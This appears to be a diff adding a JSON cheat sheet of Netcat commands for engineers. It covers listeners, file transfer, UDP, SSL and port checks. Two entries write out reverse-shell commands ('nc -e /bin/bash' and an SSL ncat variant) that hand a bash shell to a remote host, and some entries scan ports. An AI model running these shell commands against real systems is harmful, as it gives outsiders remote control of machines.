@@ -1,0 +1,204 @@
+{
+  "title": "Netcat Cheat Sheet",
+  "slug": "netcat",
+  "description": "A quick reference for common Netcat commands and patterns.",
+  "audience": "engineer",
+  "category": "Networking",
+  "commands": [
+    {
+      "command": "nc -l 1234",
+      "description": "Start a TCP server listening on port 1234",
+      "scenario": "Start a TCP server listening on port 1234",
+      "language": "bash",
+      "tags": [
+        "server",
+        "tcp",
+        "listen"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc 192.168.1.1 1234",
+      "description": "Connect to a server on port 1234",
+      "scenario": "Connect to a server on port 1234",
+      "language": "bash",
+      "tags": [
+        "client",
+        "connect",
+        "tcp"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -l 1234 > received_file.txt",
+      "description": "Transfer a file over TCP",
+      "scenario": "Transfer a file over TCP",
+      "language": "bash",
+      "tags": [
+        "file transfer",
+        "tcp",
+        "listen"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -zv 192.168.1.1 20-80",
+      "description": "Scan ports on a target host",
+      "scenario": "Scan ports on a target host",
+      "language": "bash",
+      "tags": [
+        "port scan",
+        "network",
+        "security"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -e /bin/bash 192.168.1.1 1234",
+      "description": "Create a reverse shell to a remote host",
+      "scenario": "Create a reverse shell to a remote host",
+      "language": "bash",
+      "tags": [
+        "reverse shell",
+        "security",
+        "network"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -u -l 1234",
+      "description": "Use UDP instead of TCP",
+      "scenario": "Use UDP instead of TCP",
+      "language": "bash",
+      "tags": [
+        "udp",
+        "listen",
+        "server"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "ncat --ssl -l 1234",
+      "description": "Encrypt communication using OpenSSL",
+      "scenario": "Encrypt communication using OpenSSL",
+      "language": "bash",
+      "tags": [
+        "encryption",
+        "ssl",
+        "security"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "ncat --ssl -e /bin/bash 192.168.1.1 1234",
+      "description": "Use a secure reverse shell with OpenSSL",
+      "scenario": "Use a secure reverse shell with OpenSSL",
+      "language": "bash",
+      "tags": [
+        "reverse shell",
+        "ssl",
+        "security"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "ncat --ssl -l 1234 > secure_received_file.txt",
+      "description": "Securely transfer files with OpenSSL",
+      "scenario": "Securely transfer files with OpenSSL",
+      "language": "bash",
+      "tags": [
+        "file transfer",
+        "ssl",
+        "security"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "cat file.txt | nc 192.168.1.1 1234",
+      "description": "Send a file to a remote host",
+      "scenario": "Send a file to a remote host",
+      "language": "bash",
+      "tags": [
+        "file transfer",
+        "send",
+        "tcp"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -l 1234 > file.txt",
+      "description": "Receive a file from a remote host",
+      "scenario": "Receive a file from a remote host",
+      "language": "bash",
+      "tags": [
+        "file transfer",
+        "receive",
+        "tcp"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "tar -cf - . | nc 192.168.1.1 1234",
+      "description": "Transfer directory contents using tar",
+      "scenario": "Transfer directory contents using tar",
+      "language": "bash",
+      "tags": [
+        "directory",
+        "tar",
+        "transfer"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "echo 'Hello, World!' | nc 192.168.1.1 1234",
+      "description": "Send a test message to a server",
+      "scenario": "Send a test message to a server",
+      "language": "bash",
+      "tags": [
+        "test",
+        "message",
+        "tcp"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "echo -e 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n' | nc example.com 80",
+      "description": "Test a web server by sending an HTTP request",
+      "scenario": "Test a web server by sending an HTTP request",
+      "language": "bash",
+      "tags": [
+        "http",
+        "test",
+        "web server"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    },
+    {
+      "command": "nc -zv 192.168.1.1 80",
+      "description": "Check if a port is open on a remote host",
+      "scenario": "Check if a port is open on a remote host",
+      "language": "bash",
+      "tags": [
+        "port",
+        "check",
+        "network"
+      ],
+      "is_curated": true,
+      "man_page": ""
+    }
+  ]
+}
